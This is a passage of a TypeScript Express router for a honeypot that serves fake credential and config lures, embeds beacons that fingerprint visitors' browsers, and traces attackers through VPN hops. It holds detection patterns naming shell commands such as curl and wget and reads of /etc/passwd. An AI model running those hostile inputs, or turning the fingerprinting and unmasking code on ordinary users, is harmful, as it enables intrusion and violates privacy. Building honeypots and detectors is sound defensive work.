// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
// Ghost Trap — Active honeypot + counter-intelligence engine.
// Detects attacker IPs, source ports, hop chains (VPN/proxy traces), beacon tracking,
// geo/WHOIS enrichment, VPN/Tor node identification, and authority report generation.
import { Router, Request, Response } from "express";
import { db } from "@workspace/db";
import {
  ghostTrapProbesTable, ghostTrapConfigTable, ghostTrapBeaconsTable,
  ghostTrapLoopSessionsTable,
  blockedIpsTable, trappedAttackersTable, silkWebTable,
  firewallConnectionQueueTable,
  ghostTrapEventsTable, ghostTrapEvidenceTable, ghostBlockedSourcesTable,
} from "@workspace/db";
import { eq, desc, sql, inArray, and, isNull } from "drizzle-orm";
import crypto from "crypto";
import dns from "dns/promises";
import net from "net";
import { requireRbac } from "../middlewares/requireRbac";
import { appendAuditEvent } from "../lib/audit-chain";
import { shipSecurityEvent } from "../lib/siem";

const router = Router();

// ─── 1×1 transparent GIF bytes ───────────────────────────────────────────────
const PIXEL_GIF = Buffer.from(
  "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64"
);

// ─── Known VPN / proxy / datacenter ASN org name patterns ────────────────────
const VPN_ORG_PATTERNS = [
  /nordvpn/i, /expressvpn/i, /express vpn/i, /mullvad/i, /protonvpn/i, /proton vpn/i,
  /surfshark/i, /private internet access/i, /\bpia\b/i, /windscribe/i, /cyberghost/i,
  /ipvanish/i, /hidemyass/i, /hide\.me/i, /purevpn/i, /tunnelbear/i, /hotspot shield/i,
  /vyprvpn/i, /strongvpn/i, /ivacy/i, /zenmate/i, /torguard/i, /avast.*vpn/i,
  /norton.*vpn/i, /bitdefender.*vpn/i, /kaspersky.*vpn/i, /avira.*vpn/i,
  /pia s\.a/i, /air vpn/i, /perfect privacy/i, /astrill/i,
];
const DATACENTER_ORG_PATTERNS = [
  /amazon/i, /\baws\b/i, /google llc/i, /google cloud/i, /microsoft/i, /azure/i,
  /digitalocean/i, /linode/i, /akamai/i, /vultr/i, /ovh/i, /hetzner/i,
  /cloudflare/i, /fastly/i, /leaseweb/i, /choopa/i, /quadranet/i, /psychz/i,
  /serverius/i, /m247/i, /tzulo/i, /hostwinds/i, /datacamp/i, /serverstack/i,
  /cogent/i, /telia/i, /zenlayer/i,
];

// ─── Classify an IP's org/ISP string ─────────────────────────────────────────
function classifyOrg(isp: string, org: string): "vpn_exit" | "datacenter" | "residential" | "corporate" | "unknown" {
  const s = `${isp} ${org}`.toLowerCase();
  if (VPN_ORG_PATTERNS.some(p => p.test(s)))      return "vpn_exit";
  if (DATACENTER_ORG_PATTERNS.some(p => p.test(s))) return "datacenter";
  if (s.includes("university") || s.includes("college") || s.includes("school")) return "corporate";
  if (isp || org) return "residential";
  return "unknown";
}

// ─── Parse full hop chain from request headers ────────────────────────────────
// Returns ordered list: [original_client, ...proxies, our_server_sees]
function parseHopChain(req: Request): string[] {
  const hops: string[] = [];

  // Check all headers that can carry real/forwarded IPs
  const xff = req.headers["x-forwarded-for"];
  if (xff) {
    const ips = (Array.isArray(xff) ? xff.join(",") : xff)
      .split(",").map(s => s.trim()).filter(Boolean);
    hops.push(...ips);
  }

  // Additional forwarding headers — may reveal more hops
  const extras = [
    "x-real-ip", "x-originating-ip", "x-cluster-client-ip",
    "x-client-ip", "true-client-ip", "cf-connecting-ip",
    "fastly-client-ip", "x-forwarded", "forwarded-for", "x-coming-from",
  ];
  for (const h of extras) {
    const v = req.headers[h] as string | undefined;
    if (v) {
      const ip = v.split(",")[0]?.trim();
      if (ip && !hops.includes(ip)) hops.push(ip);
    }
  }

  // The socket-level IP (last visible hop to us)
  const socketIp = req.socket?.remoteAddress ?? "";
  if (socketIp && !hops.includes(socketIp)) hops.push(socketIp);

  // Deduplicate while preserving order
  return [...new Set(hops)].filter(ip => ip && ip !== "unknown");
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
const tarpit = (ms: number) => new Promise(r => setTimeout(r, ms));

async function getConfig(userId: string, detectedIp?: string) {
  const rows = await db.select().from(ghostTrapConfigTable)
    .where(eq(ghostTrapConfigTable.userId, userId)).limit(1);
  if (rows.length) {
    // Back-fill IP if we now know it and didn't before
    if (detectedIp && !rows[0].userDetectedIp) {
      await db.update(ghostTrapConfigTable).set({ userDetectedIp: detectedIp })
        .where(eq(ghostTrapConfigTable.id, rows[0].id));
      return { ...rows[0], userDetectedIp: detectedIp };
    }
    return rows[0];
  }
  const token = crypto.randomBytes(24).toString("hex");
  const [cfg] = await db.insert(ghostTrapConfigTable)
    .values({ userId, userToken: token, userDetectedIp: detectedIp ?? null })
    .returning();
  return cfg;
}

function getIp(req: Request): string {
  const fwd = req.headers["x-forwarded-for"];
  return (Array.isArray(fwd) ? fwd[0] : fwd)?.split(",")[0]?.trim()
    || req.socket?.remoteAddress || req.ip || "unknown";
}

function getSourcePort(req: Request): number | null {
  return req.socket?.remotePort ?? null;
}

// ─── Attack detection ─────────────────────────────────────────────────────────
function detectAttack(data: string): { type: string; vector: string } | null {
  if (!data) return null;
  const s = data.toLowerCase();

  const SQL: [RegExp, string][] = [
    [/union\s+select/i,         "UNION SELECT"],
    [/'\s*or\s+['"]?\d/i,       "OR injection"],
    [/'\s*and\s+['"]?\d/i,      "AND injection"],
    [/;\s*(drop|delete|insert|update|truncate)\s/i, "destructive SQL"],
    [/\bsleep\s*\(\d/i,         "time-based blind (SLEEP)"],
    [/benchmark\s*\(\d/i,       "time-based blind (BENCHMARK)"],
    [/xp_cmdshell/i,            "xp_cmdshell"],
    [/load_file\s*\(/i,         "LOAD_FILE"],
    [/outfile\s+['"]/i,         "INTO OUTFILE"],
    [/information_schema/i,     "information_schema dump"],
    [/--\s*$/m,                 "SQL comment terminator"],
    [/\/\*.*\*\//,              "SQL block comment"],
    [/0x[0-9a-f]{4,}/i,         "hex encoding"],
    [/\bchar\s*\(\d/i,          "CHAR() encoding"],
  ];
  for (const [re, label] of SQL) if (re.test(s)) return { type: "sql_injection", vector: label };

  const XSS: [RegExp, string][] = [
    [/<script[\s>]/i,           "<script> tag"],
    [/javascript:/i,            "javascript: URI"],
    [/on\w+\s*=/i,              "event handler (on*)"],
    [/<img[^>]+src/i,           "<img> injection"],
    [/<svg[^>]*on\w+/i,         "SVG event injection"],
    [/\balert\s*\(/i,           "alert() call"],
    [/document\.cookie/i,       "cookie theft"],
    [/eval\s*\(/i,              "eval() call"],
  ];
  for (const [re, label] of XSS) if (re.test(s)) return { type: "xss", vector: label };

  const CMD: [RegExp, string][] = [
    [/;\s*(ls|cat|id|whoami|pwd|wget|curl)\b/i, "shell command injection"],
    [/\|\s*(ls|cat|id|whoami|pwd)\b/i,          "pipe injection"],
    [/&&\s*(ls|cat|id|whoami)/i,                "chain injection"],
    [/\$\([^)]+\)/,                             "command substitution $()"],
    [/`[^`]+`/,                                 "backtick injection"],
    [/curl\s+http/i,                            "curl SSRF"],
    [/nslookup\s+/i,                            "nslookup OOB"],
  ];
  for (const [re, label] of CMD) if (re.test(s)) return { type: "cmd_injection", vector: label };

  const PATH: [RegExp, string][] = [
    [/\.\.(\/|%2f)/i,   "path traversal ../"],
    [/\/etc\/passwd/i,  "/etc/passwd"],
    [/\/proc\/self/i,   "/proc/self"],
    [/\bboot\.ini\b/i,  "boot.ini"],
    [/win\.ini/i,       "win.ini"],
  ];
  for (const [re, label] of PATH) if (re.test(s)) return { type: "path_traversal", vector: label };

  return null;
}

// ─── Geo enrichment — async, fire-and-forget ──────────────────────────────────
async function enrichGeo(probeId: string, ip: string) {
  if (!ip || isPrivateIp(ip)) return;
  try {
    const res = await fetch(`https://ipwhois.app/json/${ip}?objects=ip,isp,org,country,city,timezone,asn`, {
      signal: AbortSignal.timeout(6000),
    });
    if (!res.ok) return;
    const d = await res.json() as Record<string, string>;
    const nodeType = classifyOrg(d.isp ?? "", d.org ?? "");
    await db.update(ghostTrapProbesTable).set({
      geoCountry:  d.country  ?? null,
      geoCity:     d.city     ?? null,
      geoIsp:      d.isp      ?? null,
      geoOrg:      d.org      ?? null,
      geoAsn:      d.asn      ?? null,
      geoTimezone: d.timezone ?? null,
      vpnDetected: nodeType === "vpn_exit",
    }).where(eq(ghostTrapProbesTable.probeId, probeId));
  } catch { /* best-effort */ }
}

function isPrivateIp(ip: string): boolean {
  return ip.startsWith("10.") || ip.startsWith("192.168.") || ip.startsWith("172.") ||
    ip.startsWith("127.") || ip === "::1" || ip === "localhost";
}

// ─── Poisoned response builder ────────────────────────────────────────────────
function buildFakeResponse(
  endpoint: string, attackType: string, beaconId: string, beaconBase: string
): { body: unknown; contentType: string } {
  const pixelUrl = `${beaconBase}/beacon/${beaconId}`;
  const jsUrl    = `${beaconBase}/beacon/${beaconId}/js`;

  const withBeaconHtml = (inner: string) =>
    `${inner}\n<!-- <img src="${pixelUrl}" width="1" height="1" style="display:none"> -->\n<script src="${jsUrl}"></script>`;

  if (endpoint.includes("login") || endpoint.includes("auth")) {
    return {
      body: {
        success: true,
        token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4iLCJpYXQiOjE3MTcwMDAwMDB9.PROXHQ_GHOST_TRAP",
        user: { id: 1, username: "admin", email: "admin@internal.corp", role: "superadmin", last_login: "2026-06-04T09:12:00Z" },
        session: crypto.randomBytes(16).toString("hex"),
        db_host: "10.0.0.5:3306", env: "production",
        monitoring_webhook: pixelUrl,
      },
      contentType: "application/json",
    };
  }
  if (endpoint.includes("user") || attackType === "sql_injection") {
    return {
      body: {
        rows: [
          { id: 1, username: "admin",     email: "admin@corp.local",   password_hash: "$2b$12$GTFakeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", role: "superadmin", avatar: pixelUrl },
          { id: 2, username: "jsmith",    email: "j.smith@corp.local", password_hash: "$2b$12$GTFakeBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", role: "admin",      avatar: pixelUrl },
          { id: 3, username: "mwilliams", email: "m.w@corp.local",     password_hash: "$2b$12$GTFakeCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", role: "user",       avatar: pixelUrl },
        ],
        total: 3, db_version: "MySQL 5.7.39-log", query_time: "0.0042s",
      },
      contentType: "application/json",
    };
  }
  if (endpoint.includes(".env") || endpoint.includes("config")) {
    const adminTok = "gt_" + crypto.randomBytes(8).toString("hex");
    return {
      body: [
        "APP_ENV=production", "DB_HOST=10.0.0.5", "DB_USER=root",
        "DB_PASS=Sup3rS3cr3tProd2024!", "DB_NAME=app_production",
        "STRIPE_SECRET=sk_live_GHOSTTRAP_FAKE_KEY_PROXHQ",
        "JWT_SECRET=GhostTrap_Fake_JWT_Secret_ProxhqVPN",
        `ADMIN_TOKEN=${adminTok}`,
        "AWS_ACCESS_KEY_ID=AKIA_GHOSTTRAP_FAKE_KEY",
        "AWS_SECRET_ACCESS_KEY=GhostTrapFakeSecret+proxhqvpn+trap",
        `MONITORING_URL=${pixelUrl}`,
        `ANALYTICS_ENDPOINT=${jsUrl}`,
      ].join("\n"),
      contentType: "text/plain",
    };
  }
  if (endpoint.includes("wp-admin") || endpoint.includes("admin")) {
    return {
      body: {
        status: "ok", version: "AdminPanel v2.1", uptime: "14d 7h", users_online: 3,
        db: { host: "localhost", name: "app_db", user: "root", version: "MySQL 5.7.39" },
        server: { os: "Ubuntu 22.04", php: "8.1.2", memory: "512M" },
        last_backup: "2026-06-04T03:00:00Z", health_check: pixelUrl,
      },
      contentType: "application/json",
    };
  }
  if (endpoint.includes("backup") || endpoint.includes(".sql")) {
    return {
      body: withBeaconHtml([
        "-- MySQL dump 10.13  Distrib 5.7.39", "-- Host: localhost    Database: app_production",
        "/*!40101 SET NAMES utf8 */;",
        "CREATE TABLE `users` (`id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255), PRIMARY KEY (`id`));",
        "INSERT INTO `users` VALUES (1,'admin','$2b$12$GTFakeAdminHash'),(2,'jsmith','$2b$12$GTFakeUserHash');",
      ].join("\n")),
      contentType: "text/plain",
    };
  }
  return {
    body: { ok: true, message: "OK", version: "1.0.4", server: "Apache/2.4.54", ping: pixelUrl },
    contentType: "application/json",
  };
}

// ─── Main probe handler ───────────────────────────────────────────────────────
async function handleProbe(req: Request, res: Response, endpointName: string, userId?: string) {
  const cfg = await getConfig(userId ?? "platform");
  if (!cfg.enabled) { res.status(503).end(); return; }

  const ip         = getIp(req);
  const sourcePort = getSourcePort(req);
  const ua         = (req.headers["user-agent"] ?? "").substring(0, 512);
  const hopChain   = parseHopChain(req);

  const rawPayload = JSON.stringify({
    query: req.query, body: req.body,
    path: req.path, headers: { "content-type": req.headers["content-type"] },
  }).substring(0, 4096);

  const allData   = rawPayload + " " + req.path;
  const attack    = detectAttack(allData);
  const probeType = attack?.type ?? (
    req.path.includes(".env") ? "recon" :
    req.path.includes("wp-") ? "recon" :
    req.method === "POST" ? "auth_brute" : "recon"
  );

  const tarpitMs = cfg.tarpitMinMs + Math.floor(Math.random() * (cfg.tarpitMaxMs - cfg.tarpitMinMs));
  await tarpit(tarpitMs);

  const beaconId   = crypto.randomUUID();
  const proto      = req.headers["x-forwarded-proto"] ?? "https";
  const host       = req.headers["x-forwarded-host"] ?? req.headers.host ?? "";
  const beaconBase = `${proto}://${host}/api/ghost-trap`;
  const fake       = buildFakeResponse(endpointName, probeType, beaconId, beaconBase);
  const fakeJson   = (typeof fake.body === "string" ? fake.body : JSON.stringify(fake.body)).substring(0, 2048);

  const probeId = crypto.randomUUID();
  await db.insert(ghostTrapProbesTable).values({
    probeId, attackerIp: ip, attackerPort: sourcePort, attackerUa: ua,
    method: req.method, endpoint: endpointName,
    rawPayload, probeType, attackVector: attack?.vector ?? null,
    fakeResponse: fakeJson, tarpitMs, beaconId,
    hopChain: hopChain.length > 1 ? JSON.stringify(hopChain) : null,
    referer:      (req.headers.referer ?? "").substring(0, 512),
    probeHeaders: JSON.stringify(req.headers).substring(0, 1024),
    userId:       userId ?? null,
  }).catch(() => {});

  // Async geo enrichment + VPN/Tor detection
  enrichGeo(probeId, ip).catch(() => {});

  // P2-B: SIEM — probe captured
  void shipSecurityEvent({
    actor: userId ?? "ghost_trap",
    action: "ghost_trap.probe_captured",
    resource: `ghost_trap_probe:${probeId}`,
    result: "allow",
    metadata: { ip, probeType, endpoint: endpointName, tarpitMs, attackVector: attack?.vector ?? null },
  });

  const [ipCount] = await db
    .select({ count: sql<number>`count(*)::int` })
    .from(ghostTrapProbesTable)
    .where(and(
      eq(ghostTrapProbesTable.attackerIp, ip),
      userId ? eq(ghostTrapProbesTable.userId, userId) : isNull(ghostTrapProbesTable.userId),
    ));
  const count = ipCount?.count ?? 1;

  if (count >= cfg.autoBlockAfter) {
    const exists = await db.select().from(blockedIpsTable)
      .where(eq(blockedIpsTable.ip, ip)).limit(1);
    if (!exists.length) {
      await db.insert(blockedIpsTable).values({
        ip, reason: `Ghost Trap: ${count} probes (${probeType})`, autoBlocked: true,
      }).catch(() => {});
      await db.update(ghostTrapProbesTable).set({ autoBlocked: true })
        .where(eq(ghostTrapProbesTable.probeId, probeId)).catch(() => {});
      void shipSecurityEvent({
        actor: userId ?? "ghost_trap",
        action: "ghost_trap.auto_block",
        resource: `ghost_trap:${ip}`,
        result: "deny",
        metadata: { ip, probeCount: count, probeType, endpoint: endpointName },
      });
    }
  }

  if (count >= cfg.silkTrapAfter) {
    const alreadyTrapped = await db.select().from(trappedAttackersTable)
      .where(eq(trappedAttackersTable.ip, ip)).limit(1);
    if (!alreadyTrapped.length) {
      const webRows = await db.select().from(silkWebTable).limit(1);
      if (webRows.length) {
        await db.insert(trappedAttackersTable).values({
          ip, fingerprint: `GHOST_TRAP|IP:${ip}|PORT:${sourcePort ?? "?"}|UA:${ua.substring(0, 80)}|PROBES:${count}`,
          entryNodeId: 1, honeypotPort: 443,
          probeType: `ghost_trap_${probeType}`,
          dataCollected: JSON.stringify({ probeCount: count, lastVector: attack?.vector, endpoint: endpointName, beaconId, sourcePort, hopChain }),
          sqlmapStatus: "idle",
        }).catch(() => {});
        await db.update(ghostTrapProbesTable).set({ silkTrapped: true })
          .where(eq(ghostTrapProbesTable.probeId, probeId)).catch(() => {});
      }
    }
  }

  res.setHeader("Content-Type", fake.contentType);
  res.setHeader("X-Powered-By", "Apache/2.4.54");
  res.setHeader("Server", "Apache/2.4.54 (Ubuntu)");
  if (typeof fake.body === "string") res.status(200).send(fake.body);
  else res.status(200).json(fake.body);
}

// ═══════════════════════════════════════════════════════════════════════════════
// PUBLIC LURE ENDPOINTS
// ═══════════════════════════════════════════════════════════════════════════════
router.all("/lure/login",      (req, res) => handleProbe(req, res, "login"));
router.all("/lure/auth",       (req, res) => handleProbe(req, res, "auth"));
router.all("/lure/admin",      (req, res) => handleProbe(req, res, "admin"));
router.all("/lure/wp-admin",   (req, res) => handleProbe(req, res, "wp-admin"));
router.all("/lure/api/users",  (req, res) => handleProbe(req, res, "api/users"));
router.all("/lure/api/search", (req, res) => handleProbe(req, res, "api/search"));
router.all("/lure/api/data",   (req, res) => handleProbe(req, res, "api/data"));
router.get("/lure/.env",       (req, res) => handleProbe(req, res, ".env"));
router.get("/lure/config.php", (req, res) => handleProbe(req, res, "config.php"));
router.get("/lure/backup.sql", (req, res) => handleProbe(req, res, "backup.sql"));
router.all("/lure/{*path}",    (req, res) => handleProbe(req, res, req.path));

// ─── Beacon endpoints (PUBLIC) ────────────────────────────────────────────────
router.get("/beacon/:beaconId", async (req, res) => {
  const { beaconId } = req.params;
  const firedFromIp  = getIp(req);
  const firedUa      = (req.headers["user-agent"] ?? "").substring(0, 512);
  // Look up the userId from the originating probe so we can attribute the beacon correctly
  const probeRows = await db.select({ userId: ghostTrapProbesTable.userId })
    .from(ghostTrapProbesTable)
    .where(eq(ghostTrapProbesTable.beaconId, String(beaconId))).limit(1).catch(() => []);
  const beaconUserId = probeRows[0]?.userId ?? null;
  await db.insert(ghostTrapBeaconsTable).values({
    beaconId: String(beaconId), probeId: String(beaconId),
    attackerIp: firedFromIp, firedFromIp,
    firedUa, firedHeaders: JSON.stringify(req.headers).substring(0, 1024),
    userId: beaconUserId,
  }).catch(() => {});
  await db.update(ghostTrapProbesTable)
    .set({ beaconFired: true, beaconFiredAt: new Date() })
    .where(eq(ghostTrapProbesTable.beaconId, beaconId)).catch(() => {});
  res.setHeader("Content-Type", "image/gif");
  res.setHeader("Cache-Control", "no-store");
  res.setHeader("X-Powered-By", "Apache/2.4.54");
  res.status(200).send(PIXEL_GIF);
});

router.get("/beacon/:beaconId/js", async (req, res) => {
  const { beaconId } = req.params;
  res.setHeader("Content-Type", "application/javascript");
  res.setHeader("Cache-Control", "no-store");
  res.status(200).send(`
(function(){
  try {
    var d = {
      l: navigator.language,
      s: screen.width + 'x' + screen.height,
      z: Intl.DateTimeFormat().resolvedOptions().timeZone,
      p: navigator.platform,
      c: navigator.hardwareConcurrency
    };
    fetch('${req.protocol}://${req.headers.host}/api/ghost-trap/beacon/${beaconId}/cb', {
      method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(d)
    }).catch(function(){});
  } catch(e){}
})();
`);
});

router.post("/beacon/:beaconId/cb", async (req, res) => {
  const { beaconId } = req.params;
  const { l, s, z } = req.body as Record<string, string>;
  await db.update(ghostTrapBeaconsTable).set({
    browserLang: l ?? null, screenSize: s ?? null, timezone: z ?? null,
  }).where(eq(ghostTrapBeaconsTable.beaconId, beaconId)).catch(() => {});
  await db.update(ghostTrapProbesTable).set({ beaconFired: true, beaconFiredAt: new Date() })
    .where(eq(ghostTrapProbesTable.beaconId, beaconId)).catch(() => {});
  res.json({ ok: true });
});

// ─── Per-user lure endpoints (PUBLIC — attributed via userToken in URL) ────────
// Each VPN user gets a unique URL like /api/ghost-trap/u/:token/lure/login
// Anyone hitting that URL is recorded as a probe against that specific user's account.
// Users share these URLs in honeypot files, fake configs, decoy pages, etc.
router.all("/u/:userToken/lure/{*path}", async (req, res) => {
  const userToken = String(req.params.userToken);
  const cfgRows = await db.select({ userId: ghostTrapConfigTable.userId })
    .from(ghostTrapConfigTable)
    .where(eq(ghostTrapConfigTable.userToken, userToken)).limit(1);
  if (!cfgRows.length) { res.status(404).end(); return; }
  const userId = cfgRows[0]!.userId;
  await handleProbe(req, res, req.path, userId);
});

// ═══════════════════════════════════════════════════════════════════════════════
// AUTH-PROTECTED DASHBOARD ENDPOINTS
// ═══════════════════════════════════════════════════════════════════════════════

router.get("/probes", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }
  const limit  = Math.min(Number(req.query.limit) || 200, 500);
  const probes = await db.select().from(ghostTrapProbesTable)
    .where(eq(ghostTrapProbesTable.userId, userId))
    .orderBy(desc(ghostTrapProbesTable.probedAt)).limit(limit);
  const [stats] = await db.select({
    total:       sql<number>`count(*)::int`,
    uniqueIps:   sql<number>`count(distinct attacker_ip)::int`,
    sqlCount:    sql<number>`count(*) filter (where probe_type = 'sql_injection')::int`,
    xssCount:    sql<number>`count(*) filter (where probe_type = 'xss')::int`,
    cmdCount:    sql<number>`count(*) filter (where probe_type = 'cmd_injection')::int`,
    blocked:     sql<number>`count(*) filter (where auto_blocked = true)::int`,
    silkTrapped: sql<number>`count(*) filter (where silk_trapped = true)::int`,
    beaconFires: sql<number>`count(*) filter (where beacon_fired = true)::int`,
    avgTarpit:   sql<number>`avg(tarpit_ms)::int`,
    vpnCount:    sql<number>`count(*) filter (where vpn_detected = true)::int`,
  }).from(ghostTrapProbesTable)
    .where(eq(ghostTrapProbesTable.userId, userId));
  res.json({ probes, stats });
});

router.get("/config", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }
  const rawIp = getIp(req);
  const detectedIp = !isPrivateIp(rawIp) ? rawIp : undefined;
  res.json(await getConfig(userId, detectedIp));
});

router.post("/config", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }
  const cfg = await getConfig(userId);
  const {
    enabled, tarpitMinMs, tarpitMaxMs, autoBlockAfter, silkTrapAfter,
    fakeSiteName, fakeDbVersion, deviceMode, userDomain,
  } = req.body as Record<string, unknown>;
  const [updated] = await db.update(ghostTrapConfigTable).set({
    ...(enabled !== undefined        && { enabled: Boolean(enabled) }),
    ...(tarpitMinMs !== undefined    && { tarpitMinMs: Number(tarpitMinMs) }),
    ...(tarpitMaxMs !== undefined    && { tarpitMaxMs: Number(tarpitMaxMs) }),
    ...(autoBlockAfter !== undefined && { autoBlockAfter: Number(autoBlockAfter) }),
    ...(silkTrapAfter !== undefined  && { silkTrapAfter: Number(silkTrapAfter) }),
    ...(fakeSiteName  !== undefined && fakeSiteName  !== null && { fakeSiteName: String(fakeSiteName) }),
    ...(fakeDbVersion !== undefined && fakeDbVersion !== null && { fakeDbVersion: String(fakeDbVersion) }),
    ...(typeof deviceMode === "string" && (deviceMode === "personal" || deviceMode === "server") && { deviceMode }),
    ...(userDomain !== undefined && { userDomain: userDomain === "" || userDomain === null ? null : String(userDomain) }),
    updatedAt: new Date(),
  }).where(eq(ghostTrapConfigTable.id, cfg.id)).returning();
  res.json(updated);
});

router.delete("/probes", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }
  await db.delete(ghostTrapProbesTable).where(eq(ghostTrapProbesTable.userId, userId));
  await db.delete(ghostTrapBeaconsTable).where(eq(ghostTrapBeaconsTable.userId, userId));
  res.json({ ok: true });
});

// ─── WHOIS on-demand ──────────────────────────────────────────────────────────
router.get("/whois/:ip", async (req, res) => {
  const { ip } = req.params;
  try {
    const r = await fetch(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, {
      signal: AbortSignal.timeout(8000),
    });
    if (!r.ok) return res.status(502).json({ error: "WHOIS lookup failed" });
    res.json(await r.json());
  } catch (e: any) {
    res.status(502).json({ error: e.message });
  }
});

// ─── VPN Backtrace Engine ─────────────────────────────────────────────────────
// For a given attacker IP, reconstruct the full hop chain, classify each node,
// attempt reverse DNS, detect VPN providers, and estimate real origin.
router.get("/backtrace/:ip", async (req, res) => {
  const { ip } = req.params;
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  // Gather all stored probes for this attacker to extract any XFF header chains
  const probes = await db.select({
    probeHeaders: ghostTrapProbesTable.probeHeaders,
    hopChain:     ghostTrapProbesTable.hopChain,
    attackerIp:   ghostTrapProbesTable.attackerIp,
    attackerPort: ghostTrapProbesTable.attackerPort,
    geoIsp:       ghostTrapProbesTable.geoIsp,
    geoOrg:       ghostTrapProbesTable.geoOrg,
    geoCountry:   ghostTrapProbesTable.geoCountry,
    geoCity:      ghostTrapProbesTable.geoCity,
    geoAsn:       ghostTrapProbesTable.geoAsn,
  }).from(ghostTrapProbesTable)
    .where(and(
      eq(ghostTrapProbesTable.attackerIp, String(ip)),
      eq(ghostTrapProbesTable.userId, userId),
    ))
    .orderBy(desc(ghostTrapProbesTable.probedAt))
    .limit(50);

  if (!probes.length) return res.status(404).json({ error: "No probes found for this IP" });

  // Collect all unique IPs from all stored hop chains
  const allHopIps = new Set<string>([ip]);
  for (const p of probes) {
    if (p.hopChain) {
      try {
        const chain = JSON.parse(p.hopChain) as string[];
        chain.forEach(h => allHopIps.add(h));
      } catch { /* ignore */ }
    }
    // Also parse from stored raw headers
    if (p.probeHeaders) {
      try {
        const hdrs = JSON.parse(p.probeHeaders) as Record<string, string>;
        const xff = hdrs["x-forwarded-for"] ?? "";
        xff.split(",").map(s => s.trim()).filter(Boolean).forEach(h => allHopIps.add(h));
        ["x-real-ip","true-client-ip","cf-connecting-ip","x-originating-ip"].forEach(h => {
          if (hdrs[h]) allHopIps.add(hdrs[h].split(",")[0]!.trim());
        });
      } catch { /* ignore */ }
    }
  }

  // Enrich each unique hop IP in parallel
  const hopIps = [...allHopIps].filter(h => h && h !== "unknown");
  const enriched = await Promise.all(hopIps.map(async (hopIp) => {
    const result: {
      ip: string;
      port: number | null;
      rdns: string | null;
      isp: string | null;
      org: string | null;
      country: string | null;
      city: string | null;
      asn: string | null;
      nodeType: string;
      vpnProvider: string | null;
      confidence: number;
      isPrivate: boolean;
    } = {
      ip: hopIp,
      port: hopIp === ip ? (probes[0]?.attackerPort ?? null) : null,
      rdns: null,
      isp: null, org: null, country: null, city: null, asn: null,
      nodeType: "unknown",
      vpnProvider: null,
      confidence: 0,
      isPrivate: isPrivateIp(hopIp),
    };

    if (result.isPrivate) {
      result.nodeType = "private_network";
      result.confidence = 99;
      return result;
    }

    // Use cached geo data for the main attacker IP if we have it
    if (hopIp === ip && probes[0]?.geoIsp) {
      result.isp     = probes[0].geoIsp;
      result.org     = probes[0].geoOrg ?? null;
      result.country = probes[0].geoCountry ?? null;
      result.city    = probes[0].geoCity ?? null;
      result.asn     = probes[0].geoAsn ?? null;
      result.nodeType = classifyOrg(result.isp ?? "", result.org ?? "");
    } else {
      // Fresh WHOIS lookup for hop IPs
      try {
        const r = await fetch(`https://ipwhois.app/json/${hopIp}?objects=isp,org,country,city,asn`, {
          signal: AbortSignal.timeout(5000),
        });
        if (r.ok) {
          const d = await r.json() as Record<string, string>;
          result.isp     = d.isp ?? null;
          result.org     = d.org ?? null;
          result.country = d.country ?? null;
          result.city    = d.city ?? null;
          result.asn     = d.asn ?? null;
          result.nodeType = classifyOrg(d.isp ?? "", d.org ?? "");
        }
      } catch { /* best effort */ }
    }

    // Reverse DNS (PTR record)
    try {
      const hostnames = await dns.reverse(hopIp);
      result.rdns = hostnames[0] ?? null;
      // rDNS can also confirm VPN — e.g. "exit.nordvpn.com"
      if (result.rdns && VPN_ORG_PATTERNS.some(p => p.test(result.rdns!))) {
        result.nodeType = "vpn_exit";
      }
    } catch { /* no PTR record */ }

    // Identify specific VPN provider
    const orgStr = `${result.isp ?? ""} ${result.org ?? ""} ${result.rdns ?? ""}`;
    const vpnMap: [RegExp, string][] = [
      [/nordvpn/i, "NordVPN"], [/expressvpn|express vpn/i, "ExpressVPN"],
      [/mullvad/i, "Mullvad VPN"], [/protonvpn|proton vpn/i, "ProtonVPN"],
      [/surfshark/i, "Surfshark"], [/private internet access|pia\b/i, "Private Internet Access"],
      [/windscribe/i, "Windscribe"], [/cyberghost/i, "CyberGhost"],
      [/ipvanish/i, "IPVanish"], [/hidemyass/i, "HideMyAss"],
      [/purevpn/i, "PureVPN"], [/tunnelbear/i, "TunnelBear"],
      [/hotspot shield/i, "Hotspot Shield"], [/vyprvpn/i, "VyprVPN"],
      [/strongvpn/i, "StrongVPN"], [/torguard/i, "TorGuard"],
      [/astrill/i, "Astrill"], [/perfect privacy/i, "Perfect Privacy"],
    ];
    for (const [re, name] of vpnMap) {
      if (re.test(orgStr)) { result.vpnProvider = name; result.nodeType = "vpn_exit"; break; }
    }

    // Confidence scoring
    if (result.nodeType === "vpn_exit")        result.confidence = result.vpnProvider ? 95 : 78;
    else if (result.nodeType === "datacenter") result.confidence = 85;
    else if (result.nodeType === "residential") result.confidence = 90;
    else if (result.nodeType === "corporate")   result.confidence = 80;
    else result.confidence = 40;

    return result;
  }));

  // Build the chain: leftmost = probable real origin, rightmost = us
  // Sort: private IPs first, then by nodeType (residential > corporate > vpn > datacenter)
  const typeOrder: Record<string, number> = {
